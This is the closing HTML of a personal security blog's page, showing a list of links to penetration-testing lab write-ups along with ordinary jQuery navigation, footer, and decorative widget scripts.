+    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2022/08/31/Tr0ll/">Tr0ll</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/08/30/Raven/">Raven2</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/08/28/vulnhub%E9%9D%B6%E6%9C%BALampiao/">Lampiao</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/08/18/vulnhub%E9%9D%B6%E6%9C%BAGOLDENEYE/">GOLDENEYE-1</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/05/12/%E6%9A%97%E6%9C%88%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA-%E9%A1%B9%E7%9B%AE%E5%85%AD/">暗月渗透实战靶场-项目六</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/04/02/msf/">Metasploit Framework</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/04/01/NC%E7%9A%84%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8/">瑞士军刀nc</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/04/01/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/">文件包含利用思路</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/02/18/CFS%E4%B8%89%E5%B1%82%E7%BD%91%E7%BB%9C/">CFS三层网络渗透</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/01/18/ICMP%E9%9A%A7%E9%81%93%E6%A8%A1%E5%BC%8F%E4%BD%BF%E7%94%A8/">ICMP隧道模式使用</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/01/17/vulnhub%E9%9D%B6%E6%9C%BAOs-hackNos-1/">Os-hackNos-1</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/01/16/Java%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/">Java网络编程</a></li></ul>
+    <script src="https://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>
+    <script>
+        $(".post-list").addClass("toc-article");
+        $(".post-list-item a").attr("target","_blank");
+        $("#post-nav-button > a:nth-child(2)").click(function() {
+            $(".fa-bars, .fa-times").toggle();
+            $(".post-list").toggle(300);
+            if ($(".toc").length > 0) {
+                $("#toc, #tocButton").toggle(200, function() {
+                    if ($(".switch-area").is(":visible")) {
+                        $("#tocButton").attr("value", valueHide);
+                        }
+                    })
+            }
+            else {
+            }
+        })
+    </script>
+
+
+
+    <script>
+        
+    </script>
+</div>
+      <footer id="footer">
+    <div class="outer">
+        <div id="footer-info">
+            <div class="footer-left">
+                &copy; 2022 mrfan6
+            </div>
+            <div class="footer-right">
+                <a href="#" target="_blank">mrfan6</a>
+            </div>
+        </div>
+        
+    </div>
+</footer>
+
+    </div>
+    
+<script src="//cdn.bootcdn.net/ajax/libs/require.js/2.3.6/require.js"></script>
+
+
+<script src="//cdn.bootcss.com/jquery/1.11.1/jquery.min.js"></script>
+
+
+<script src="/js/main.js"></script>
+
+
+    <script>
+        $(document).ready(function() {
+            var backgroundnum = 24;
+            var backgroundimg = "url(/background/bg-x.jpg)".replace(/x/gi, Math.ceil(Math.random() * backgroundnum));
+            $("#mobile-nav").css({"background-image": backgroundimg,"background-size": "cover","background-position": "center"});
+            $(".left-col").css({"background-image": backgroundimg,"background-size": "cover","background-position": "center"});
+        })
+    </script>
+
+
+
+
+
+<div class="scroll" id="scroll">
+    <a href="#"><i class="fa fa-arrow-up"></i></a>
+    <a href="#comments"><i class="fa fa-comments-o"></i></a>
+    <a href="#footer"><i class="fa fa-arrow-down"></i></a>
+</div>
+<script>
+    $(document).ready(function() {
+        if ($("#comments").length < 1) {
+            $("#scroll > a:nth-child(2)").hide();
+        };
+    })
+</script>
+
+<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+
+  <script language="javascript">
+    $(function() {
+        $("a[title]").each(function() {
+            var a = $(this);
+            var title = a.attr('title');
+            if (title == undefined || title == "") return;
+            a.data('title', title).removeAttr('title').hover(
+
+            function() {
+                var offset = a.offset();
+                $("<div id=\"anchortitlecontainer\"></div>").appendTo($("body")).html(title).css({
+                    top: offset.top - a.outerHeight() - 15,
+                    left: offset.left + a.outerWidth()/2 + 1
+                }).fadeIn(function() {
+                    var pop = $(this);
+                    setTimeout(function() {
+                        pop.remove();
+                    }, pop.text().length * 800);
+                });
+            }, function() {
+                $("#anchortitlecontainer").remove();
+            });
+        });
+    });
+</script>
+
+
+  </div>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"model":{"jsonPath":"/live2dw/assets/hijiki.model.json"},"display":{"position":"right","width":300,"height":300},"mobile":{"show":true},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
+<!-- 页面点击小红心 -->
+<script type="text/javascript" src="/js/love.js"></script>
+<!--动态线条背景-->
+<script type="text/javascript"
+color="220,220,220" opacity='0.7' zIndex="-2" count="200" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js">
+</script>
